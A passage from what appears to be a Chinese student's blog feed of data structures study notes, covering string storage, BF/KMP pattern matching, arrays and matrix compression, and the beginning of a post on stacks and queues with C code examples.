结构体的<code>ch</code> 成员中，从索引 1 开始，最多复制 <code>MAXLEN</code>个字符。</li></ul><p><code>s-&gt;ch[s-&gt;length + 1] = '\0';</code>：</p><ul><li>这行代码在字符串的末尾添加了一个空字符<code>'\0'</code>，以确保字符串正确终止。</li><li><code>s-&gt;length</code> 是字符串的长度，所以<code>s-&gt;length + 1</code>是字符串的下一个位置，用于放置空字符。</li></ul><p>总体而言，<code>initSString</code> 函数的作用是接受一个常规的 C字符串（以 <code>'\0'</code>结尾），计算其长度并将其复制到自定义的字符串结构体 <code>SString</code>中。这个函数假设字符串是从索引 1开始的，并在复制过程中保留了一个空字符作为字符串的结尾。</p></blockquote><h3 id="堆分配存储结构">2. 堆分配存储结构</h3><p>堆分配存储是指的是用一整块适当大小的堆内存空间来存储字符串。</p><p>所谓堆内存，就是堆区的内存空间。以 C语言为例，程序运行时占用的内存空间会分成很多大小不等的块（区域），它们通常被称为堆区、栈区、常量区、全局数据区、代码区等。这些区域各有分工，比如全局数据区用来存储全局变量和静态变量，代码区用来存储要运行的程序指令等。</p><p>和内存的其它区域相比，堆区最大的特点就是：不会自动分配和回收，必须由程序员手动申请，使用完后再手动释放。</p><p>在 C 语言中，申请堆内存的操作可以调用 malloc() 或者 calloc()函数来完成，例如：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">char</span> * a = (<span class="hljs-type">char</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">5</span> * <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">char</span>));<br></code></pre></td></tr></table></figure><p>如果 malloc() 函数执行成功，我们就申请了能存储 5个字符的堆内存空间。</p><p>如果申请的堆内存空间不够用，还可以调用 realloc() 函数扩容，例如：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">a = (<span class="hljs-type">char</span> *)<span class="hljs-built_in">realloc</span>(a, <span class="hljs-number">10</span> * <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">char</span>));<br></code></pre></td></tr></table></figure><p>realloc() 函数执行成功，原本只能存 5 个字符的堆内存，扩容成能存储 10个字符。</p><p>堆内存使用完后，需要手动调用 free() 函数释放，例如：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">free</span>(a);<br></code></pre></td></tr></table></figure><p>强调：堆内存必须及时手动释放，否则会造成内存泄漏。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//串的堆分配存储结构，可以用如下的结构体来表示：</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>    <span class="hljs-type">char</span>* ch;  <span class="hljs-comment">//ch 用来指向申请好的堆空间，以便存储字符串；</span><br>    <span class="hljs-type">int</span> length; <span class="hljs-comment">//length 用来记录串的长度。</span><br>&#125;HString;<br></code></pre></td></tr></table></figure><h3 id="块链存储表示">3. 块链存储表示</h3><p><strong>串的链式存储结构：</strong></p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312241856756.png"alt="串的链式存储结构" /><figcaption aria-hidden="true">串的链式存储结构</figcaption></figure><ul><li>优点：操作方便</li><li>缺点：存储密度较低</li></ul><p><spanclass="math inline">\(存储密度=串值所占的存储/实际分配的存储\)</span></p><p>可将多个字符存放在一个结点中，以克服其缺点，这就是<strong>串的链式存储结构---块链结构</strong></p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312241858169.png"alt="串的链式存储结构---块链结构" /><figcaption aria-hidden="true">串的链式存储结构---块链结构</figcaption></figure><ul><li>优点：不需要大块连续空间；</li><li>缺点：占用存储量大，操作复杂，不如顺序存储方式方便</li><li>块链结点大小≥1</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> CHUNKSIZE 80 <span class="hljs-comment">//块的大小由用户定义</span></span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Chunk</span>&#123;</span><br>    <span class="hljs-type">char</span> ch[CHUNKSIZE] ;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Chunk</span> *<span class="hljs-title">next</span>;</span><br>&#125;Chunk ;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span>&#123;</span><br>    Chunk *head, *tail; <span class="hljs-comment">//串的头指针和尾指针，设置根据实际需要</span><br>    <span class="hljs-type">int</span> curlen;  <span class="hljs-comment">//串的当前长度</span><br>&#125;Lstring; <span class="hljs-comment">//字符串的块链结构</span><br><br><br></code></pre></td></tr></table></figure><blockquote><p>这部分可以再参考一下：<ahref="http://data.biancheng.net/view/178.html">串的块链存储结构（C语言）详解(biancheng.net)</a></p></blockquote><h2 id="串的模式匹配算法">4.3.3 串的模式匹配算法</h2><blockquote><p>老师说串的基本操作在c语言里面都学过了，所以就讲了这一个（我学你的内阁😡</p></blockquote><p>算法目的：确定主串中所含子串(模式串)第一次出现的位置 (定位)</p><p>算法应用：搜索引擎、拼写检查、语言翻译、数据压缩</p><p>算法种类：</p><ul><li>BF算法（Brute-Force，又称古典的、经典的、朴素的、穷举的）</li><li>KMP算法（特点：速度快）</li></ul><h3 id="bf算法">1. BF算法</h3><p>Brute-Force简称为BF算法，亦称简单匹配算法。采用穷举法的思想</p><p>主串：正文串</p><p>子串：模式串</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312242349069.png"alt="BF算法" /><figcaption aria-hidden="true">BF算法</figcaption></figure><p>算法的思路是从S的每一个字符开始依次与T的字符进行匹配</p><p>下图展示了模式串<code>T = “abcac”</code>和主串S的匹配过程</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312242355840.png"alt="BF算法过程" /><figcaption aria-hidden="true">BF算法过程</figcaption></figure><p><code>Index(S,T,pos)</code></p><ul><li>将主串的第pos个字符和模式串的第一个字符比较</li><li>若相等，继续逐个比较后续字符</li><li>若不等，从主串的下一字符起，重新与模式串的第一个字符比较</li><li>直到主串的一个连续子串字符序列与模式串相等。返回值为S中与T匹配的子序列第一个字符的序号，即匹配成功。</li><li>否则，匹配失败，返回值 0</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// BF算法</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">Index_BF</span><span class="hljs-params">(SString S, SString T)</span>&#123;<br>    <span class="hljs-type">int</span> i = <span class="hljs-number">1</span>, j = <span class="hljs-number">1</span>;<br><span class="hljs-keyword">while</span>(i &lt;= S.length &amp;&amp; j &lt;= T.length)&#123;<br><span class="hljs-keyword">if</span>(S.ch[i] == T.ch[j])&#123;<br>++i; ++j;<span class="hljs-comment">//继续比较后继字符</span><br>&#125;<span class="hljs-keyword">else</span>&#123;<br>i = i-j+<span class="hljs-number">2</span>;<br>            <span class="hljs-comment">//对i = i-j+2我的理解：</span><br>            <span class="hljs-comment">//原因是我们循环是从1开始计数的，如果我们是从0开始计数，其实很好理解，直接i-j+1，i前移一个</span><br>            <span class="hljs-comment">//但我们是从1开始计数的，再加个1，就是i-j+2</span><br>j = <span class="hljs-number">1</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span>(j &gt; T.length)&#123;<br><span class="hljs-keyword">return</span> i - T.length; <span class="hljs-comment">// 返回匹配的第一个字符的下标</span><br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  <span class="hljs-comment">// 模式比匹配不成功</span><br>&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// BF算法，课本上的</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">Index_BF</span><span class="hljs-params">(SString S, SString T, <span class="hljs-type">int</span> pos)</span>&#123;<br>    <span class="hljs-type">int</span> i = pos, j = <span class="hljs-number">1</span>;<br><br>    <span class="hljs-comment">//后面代码都一样，书上的意思是不从第一个字符来比，而是从第pos个字符来比</span><br>    ……<br><br></code></pre></td></tr></table></figure><p><strong>BF算法复杂度分析</strong></p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312250003240.png"alt="BF算法复杂度分析" /><figcaption aria-hidden="true">BF算法复杂度分析</figcaption></figure><h3 id="kmp算法">2. KMP算法</h3><blockquote><p>Knuth Morris Pratt 算法</p><p>草，听了半天有点难听懂啊😴😴😴</p></blockquote><p>KMP算法是D.E.Knuth、J.H.Morris和VR.Pratt共同提出的，简称KMP算法</p><p>该算法较BF算法有较大改进，从而使算法效率有了某种程度的提高.</p><blockquote><p>好像期末考试不考，之后再来补这个坑😬😬</p></blockquote><p><ahref="http://data.biancheng.net/view/306.html">KMP算法完全攻略（C语言实现）(biancheng.net)</a></p><h1 id="数组">4.4 数组</h1><h2 id="数组的定义和特点">4.4.1 数组的定义和特点</h2><p>数组：按一定格式排列起来的具有<strong>相同类型</strong>的数据元素的集合</p><p>一维数组：若线性表中的数据元素为非结构的简单元素，则称为一维数组</p><p>一维数组的逻辑结构：线性结构。是一个定长的线性表</p><p>声明格式：数据类型变量名称[长度]</p><p>例：<code>int num[5] =&#123;0，1，2，3，4&#125;;</code></p><p><strong>二维数组</strong></p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312250031124.png"alt="二维数组" /><figcaption aria-hidden="true">二维数组</figcaption></figure><p>二维数组：若一维数组中的数据元素又是一维数组结构，则称为二维数组</p><p>二维数组的逻辑结构：</p><ul><li>非线性结构：每一个数据元素既在一个行表中又在一个列表中。</li><li>线性结构：该线性表的每个数据元素也是一个定长的线性表</li></ul><p>声明格式：数据类型 变量名称[行数] [列数]</p><p>例：<code>int num[5] [8]</code>，一个五行八列的数组</p><p>在C语言中，一个二维数组类型也可以定义为一维数组类型（其分量类型为一维数组类型）</p><p>即：<code>typedef elemtype array2[m][n]</code></p><p>等价于：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-keyword">typedef</span> elemtype <span class="hljs-built_in">array</span>1[n];<br><span class="hljs-keyword">typedef</span> <span class="hljs-built_in">array</span>1 <span class="hljs-built_in">array</span>2[m];<br></code></pre></td></tr></table></figure><p>三维数组：若二维数组中的元素又是一个一维数组， 则称作三维数组</p><p>n维数组：若n-1维数组中的元素又是一个一维数组结构则称作n维数组</p><p>结论：线性表结构是数组结构的一个特例，而数组结构又是线性表结构的扩展</p><ul><li>数组特点：结构固定——定义后，维数和维界不再改变。</li><li>数组基本操作：除了结构的初始化和销毁之外只有取元素和修改元素值的操作</li></ul><h2 id="数组的抽象数据类型定义">4.4.2 数组的抽象数据类型定义</h2><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312281714848.png"alt="数组的抽象数据类型定义" /><figcaption aria-hidden="true">数组的抽象数据类型定义</figcaption></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312281716919.png"alt="二维数组的抽象数据类型定义" /><figcaption aria-hidden="true">二维数组的抽象数据类型定义</figcaption></figure><h2 id="数组的顺序存储">4.4.3 数组的顺序存储</h2><p>因为：</p><ul><li><p>数组特点：结构固定维数和维界不变</p></li><li><p>数组基本操作：初始化、销毁、取元素、修改元素值。一般不做插入和删除操作</p></li></ul><p>所以：</p><p>一般都是采用顺序存储结构来表示数组</p><p>注意：数组可以是多维的但存储数据元素的内存单元地址是一维的，因此，在存储数组结构之前，需要解决将多维关系映射到一维关系的问题</p><h3 id="一维数组">1. 一维数组</h3><p>例，有数组定义： <code>int a[5];</code></p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312281725190.png"alt="一维数组" /><figcaption aria-hidden="true">一维数组</figcaption></figure><h3 id="二维数组">2. 二维数组</h3><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312281727914.png"alt="二维数组" /><figcaption aria-hidden="true">二维数组</figcaption></figure><p>存储单元是一维结构，而数组是个多维结构，则用一组连续存储单元存放数组的数据元素就有个次序约定问题</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312281734245.png"alt="以行序为主序" /><figcaption aria-hidden="true">以行序为主序</figcaption></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312281735072.png"alt="以列序为主序" /><figcaption aria-hidden="true">以列序为主序</figcaption></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312281736259.png"alt="二维数组的存储方式" /><figcaption aria-hidden="true">二维数组的存储方式</figcaption></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312281742777.png"alt="计算公式" /><figcaption aria-hidden="true">计算公式</figcaption></figure><ul><li>一个例题</li></ul><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312281742118.png"alt="例题" /><figcaption aria-hidden="true">例题</figcaption></figure><h2 id="特殊矩阵的压缩存储">4.4.4 特殊矩阵的压缩存储</h2><p>矩阵：一个由 m*n个元素排成的 m 行n 列的表</p><p>矩阵的常规存储：将矩阵描述为一个二维数组</p><p>矩阵的常规存储的特点：可以对其元素进行随机存取；矩阵运算非常简单；存储的密度为1。</p><p>不适宜常规存储的矩阵：值相同的元素很多且呈某种规律分布；零元素多</p><p>矩阵的压缩存储：为多个相同的非零元素只分配一个存储空间；对零元素不分配空间。</p><ol type="1"><li><p>什么是压缩存储？</p><p>若多个数据元素的值都相同，则只分配一个元素值的存储空间，且零元素不占存储空间。</p></li><li><p>什么样的矩阵能够压缩？</p><p>一些特殊矩阵，如：对称矩阵，对角矩阵，三角矩阵，稀疏矩阵等</p></li><li><p>什么叫稀疏矩阵？</p><p>矩阵中非零元素的个数较少 (一般小于5%)</p></li></ol><blockquote><p>先不边看网课边记笔记了，感觉这个对期末考试用处没直接看题目，然后针对性的学有用——2023.12.29</p></blockquote><blockquote><p>参考：</p><p><ahref="http://data.biancheng.net/view/304.html">串的定长顺序存储结构（C语言实现）(biancheng.net)</a></p><p><ahref="https://blog.csdn.net/Real_Fool_/article/details/113877781">数据结构：串(String)【详解】_数据结构sstring-CSDN博客</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>数据结构</category>
      
    </categories>
    
    
    <tags>
      
      <tag>数据结构</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>数据结构 3 栈和队列</title>
    <link href="/2023/12/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%203%20%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97/"/>
    <url>/2023/12/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%203%20%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97/</url>
    
    <content type="html"><![CDATA[<blockquote><p>根据b站王卓老师的课程记录的学习笔记📕</p><p>现在已经实现顺序栈的各种操作，</p><p>还有链栈、队列</p></blockquote><h1 id="栈和队列的定义和特点">3.1 栈和队列的定义和特点</h1><p>栈和队列是两种重要的线性结构。栈和队列是限定插入和删除只能在表的“端点”进行的线性表。</p><p>由于栈的操作具有<strong>后进先出</strong>的固有特性，使栈成为程序设计中有用的工具。另外，如果问题求解过程中具有“后进先出”的天然特性，则求解的算法中必须利用<strong>栈</strong></p><blockquote><p>数制转换 表达式求值 括号匹配的检验 八皇后问题 行编辑程序 函数调用迷宫求解 递归调用的实现</p></blockquote><p>由于队列的操作具有<strong>先进先出</strong>的特性，使得队列成为程序设计中解决类似排队问题的有用工具。</p><blockquote><p>脱机打印输出按申请的先后顺序依次输出</p><p>多用户系统中多个用户排成队，分时地循环使用CPU和主存</p><p>按用户的优先级排成多个队，每个优先级一个队列</p><p>实时控制系统中信号按接收的先后顺序依次处理</p><p>网络电文传输按照到达时间的先后顺序依次进行</p></blockquote><p>栈和队列的基本操作是线性表操作的子集，它们是操作受限的线性表，因此，可称为限定性的数据结构。</p><h2 id="栈的定义和特点">3.1.1 栈的定义和特点</h2><h3 id="栈的定义">1. 栈的定义</h3><p>栈(stack)：是一个特殊的线性表，是限定仅在一端（通常是表尾）进行插入或删除操作的线性表。</p><p>又称后进先出（Last In First Out）的线性表，简称LIFO结构</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312221546297.png"alt="栈" /><figcaption aria-hidden="true">栈</figcaption></figure><h3 id="栈的相关概念">2. 栈的相关概念</h3><p>栈 是仅在表尾进行插入、删除操作的线性表</p><p>表尾 (即<span class="math inline">\(a_n\)</span>端) 称为栈顶Top；表头 (即<span class="math inline">\(a_1\)</span>端)称为栈底Base</p><p>例如：栈<code>s = (a, a2, a3,....., an-1, an)</code>，a1称为栈底元素，an称为栈顶元素</p><p>插入元素到栈顶 (即表尾) 的操作，称为入栈或进栈或压栈</p><p>从栈顶 (即表尾) 删除最后一个元素的操作，称为出栈或弹栈</p><blockquote><p>入 = 压入 = PUSH (x)，出 = 弹出 = POP (y)</p></blockquote><p>栈的小结：</p><ol type="1"><li><p>定义：限定只能在表的一端进行插入和删除操作运算的线性表（只能在栈顶操作）</p></li><li><p>逻辑结构：同线性表一样栈元素具有线性关系即前驱后继关系(一对一)</p></li><li><p>存储结构：顺序栈和链栈均可，顺序栈更常见</p></li><li><p>运算规则：只能在栈顶运算，且访问结点时依照后进先出的原则(LIFO)</p></li><li><p>实现方式：关键是编写入栈和出栈函数，具体实现依顺序栈和链栈的不同而不同</p></li></ol><p>栈和线性表唯一的区别在于运算规则。线性表插入删除位置任意而栈只能对表尾(栈顶)的元素进行插入和删除操作。</p><h2 id="队列的基本概念">3.1.2 队列的基本概念</h2><h3 id="队列的定义">1. 队列的定义</h3><p>队列（queue）是只允许在一端进行插入操作，而在另一端进行删除操作的线性表。</p><p>队列是一种先进先出（First In FirstOut）的线性表，简称FIFO。允许插入的一端称为队尾，允许删除的一端称为队头。</p><p>队头（Front）：允许删除的一端，又称队首。</p><p>队尾（Rear）：允许插入的一端。</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312221552150.png"alt="队列" /><figcaption aria-hidden="true">队列</figcaption></figure><h3 id="队列的相关概念">2. 队列的相关概念</h3><p>队列的总结：</p><ol type="1"><li><p>定义：只能在表的一端进行插入运算在表的另一端进行删除操作运算的线性表（头删尾插）</p></li><li><p>逻辑结构：同线性表一样，仍为一对一关系</p></li><li><p>存储结构：顺序队和链队均可，以循环顺序队列更常见</p></li><li><p>运算规则：只能在队首和队尾运算，且访问结点时依照先进先出的原则（FIFO）</p></li><li><p>实现方式：关键是掌握入队和出队操作，具体实现依顺序队和链队的不同而不同</p></li></ol><h1 id="案例引入">3.2 案例引入</h1><p>进制转换</p><p>括号匹配的检验</p><p>表达式求值</p><p>舞伴问题</p><h1 id="栈的表示和操作的实现">3.3 栈的表示和操作的实现</h1><h2 id="栈的抽象数据类型的定义">3.3.1 栈的抽象数据类型的定义</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">ADT Stack&#123;<br>  数据对象：D = &#123;ai|ai ∈ ElemSet, i=<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,…n;n≥<span class="hljs-number">0</span>&#125;<br>  数据关系：R1 = &#123;&lt;ai<span class="hljs-number">-1</span>,ai&gt;|ai<span class="hljs-number">-1</span>,ai∈D，i=<span class="hljs-number">2</span>,…n&#125;，约定an端为栈顶，a1端为栈底<br>  基本操作：初始化、入栈、出栈、取栈顶元素等<br>&#125;ADT Stack<br><br></code></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">InitStack</span><span class="hljs-params">(&amp;S)</span></span> 初始化操作<br>操作结果: 构造一个空栈 S。<br><span class="hljs-function"><span class="hljs-title">DestroyStack</span><span class="hljs-params">(&amp;S)</span></span> 销毁栈操作<br>初始条件: 栈 S 已存在。<br>操作结果: 栈 S 被销毁<br><span class="hljs-function"><span class="hljs-title">StackEmpty</span><span class="hljs-params">(S)</span></span> 判定S是否为空栈<br>初始条件: 栈 S 已存在<br>操作结果: 若栈 S 为空栈，则返回TRUE，否则 FALSE<br><span class="hljs-function"><span class="hljs-title">StackLength</span><span class="hljs-params">(S)</span></span> 求栈的长度<br>初始条件: 栈 S 已存在<br>操作结果: 返回 S 的元素个数，即栈的长度<br><span class="hljs-function"><span class="hljs-title">GetTop</span><span class="hljs-params">(S, &amp;e)</span></span> 取栈顶元素<br>初始条件: 栈 S 已存在且非空<br>操作结果: 用 e 返回 S 的顶元素<br><span class="hljs-function"><span class="hljs-title">ClearStack</span><span class="hljs-params">(&amp;S)</span></span> 置空操作<br>初始条件: 栈 S 已存在<br>操作结果: 将 S 清为空栈。<br><span class="hljs-function"><span class="hljs-title">Push</span><span class="hljs-params">(&amp;S, e)</span></span>  入栈操作<br>初始条件: 栈 S 已存在<br>操作结果: 插入元素 e 为新的栈顶元素<br><span class="hljs-function"><span class="hljs-title">Pop</span><span class="hljs-params">(&amp;S, &amp;e)</span></span>  出栈操作<br>初始条件: 栈 S已存在且非空<br>操作结果: 删除 S的栈顶元素an，并用e 返回其值。<br><br></code></pre></td></tr></table></figure><p>由于栈本身就是线性表，于是栈也有顺序栈和链栈两种实现方式</p><p>栈的顺序存储——顺序栈</p><p>栈的链式存储——链栈</p><h2 id="顺序栈的表示和实现">3.3.2 顺序栈的表示和实现</h2><h3 id="顺序栈的概述">1. 顺序栈的概述</h3><p>存储方式：同一般的线性表的顺序存储结构完全相同，</p><p>利用一组地址连续的存储单元（数组）依次存放自栈底到栈顶的数据元素，栈底一般在低地址端</p><ul><li><p>附设top指针，指示栈顶元素在顺序栈的位置</p><p>但是为了方便操作，通常top指针指向栈顶元素之上的下标地址，指向线性表中的<spanclass="math inline">\(a_{n+1}\)</span></p></li><li><p>另设base指针，指示栈底元素在顺序栈的位置</p></li><li><p>另外用stacksize表示栈可使用的最大容量，C语言中下标不能越界否则就有语法错误</p></li></ul><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312221639355.png"alt="栈的结构" /><figcaption aria-hidden="true">栈的结构</figcaption></figure><p>空栈：<code>base == top</code> 是栈空标志</p><p>栈满：<code>top-base==stacksize</code></p><p>栈满时的处理方法：</p><ol type="1"><li>报错,返回操作系统</li><li>分配更大的空间，作为栈的存储空间,将原栈的内容移入新栈</li></ol><p>使用数组作为顺序栈存储方式的特点：简单、方便、但易产生溢出（数组大小固定）</p><p>上溢(overflow)：栈已经满，又要压入元素</p><p>下溢(underflow)：栈已经空，还要弹出元素</p><p>注：上溢是一种错误，使问题的处理无法进行；而下溢一般认为是一种结束条件，即问题处理结束。</p><h3 id="顺序栈的实现">2. 顺序栈的实现</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAXSIZE 100</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span>&#123;</span><br>    SElemType *base;  <span class="hljs-comment">//栈底指针</span><br>SElemType *top; <span class="hljs-comment">//栈顶指针</span><br>    <span class="hljs-type">int</span> stacksize; <span class="hljs-comment">//栈可用最大容量</span><br>&#125;SqStack;<br></code></pre></td></tr></table></figure><p><code>top</code>和<code>base</code>可以定义为整型存储数组的下标或者定义为<strong>指针</strong>（指针相减的前提是两指针指向同一数组）</p><h3 id="顺序栈的初始化">3. 顺序栈的初始化</h3><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312231152608.png"alt="顺序栈的初始化" /><figcaption aria-hidden="true">顺序栈的初始化</figcaption></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//初始化栈,构造一个空栈S</span><br>Status <span class="hljs-title function_">InitStack</span><span class="hljs-params">(SqStack &amp;S)</span>&#123;<br>    S.base = new SElemType[MAXSIZE];<br>    <span class="hljs-comment">//或S.base = (SElemType *)malloc(MAXSIZE*sizeof(SElemType));</span><br>    <span class="hljs-keyword">if</span> (!S.base) <span class="hljs-built_in">exit</span>(OVERFLOW); <span class="hljs-comment">//存储分配失败</span><br>    S.top = S.base; <span class="hljs-comment">//栈顶指针等于栈底指针</span><br>    S.stacksize = MAXSIZE;<br>    <span class="hljs-keyword">return</span> OK;  <br>&#125;<br></code></pre></td></tr></table></figure><h3 id="判断顺序栈是否为空">4. 判断顺序栈是否为空</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//判断是否为空栈</span><br>Status <span class="hljs-title function_">StackEmpty</span><span class="hljs-params">(SqStack S)</span>&#123;<br><span class="hljs-keyword">if</span> (S.top==S.base)<br>        <span class="hljs-keyword">return</span> TRUE;<span class="hljs-comment">//栈为空返回TRUE</span><br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">return</span> FALSE;<span class="hljs-comment">//栈不为空返回FALSE</span><br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="求顺序栈的长度">5. 求顺序栈的长度</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">int</span> <span class="hljs-title function_">StackLength</span><span class="hljs-params">(SqStack S)</span>&#123;<br>    <span class="hljs-keyword">return</span> S.top - S.base;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="清空销毁顺序栈">6. 清空、销毁顺序栈</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//清空顺序栈</span><br>Status <span class="hljs-title function_">ClearStack</span><span class="hljs-params">(SqStack &amp;S)</span>&#123; <span class="hljs-comment">//这里应该加上&amp;，不加上的话相当于没对栈进行操作</span><br>    <span class="hljs-keyword">if</span>(S.base) S.top = S.base;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;  <br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//销毁了之后空间豆释放了</span><br><span class="hljs-comment">//</span><br>Status <span class="hljs-title function_">DestroyStack</span><span class="hljs-params">(SqStack &amp;S)</span>&#123;<br>    <span class="hljs-keyword">if</span>(S.base)&#123;<br>        delete S.base;<br>        S.stacksize = <span class="hljs-number">0</span>;<br>        S.base = S.top = <span class="hljs-literal">NULL</span>;<br>    &#125;<br>   <span 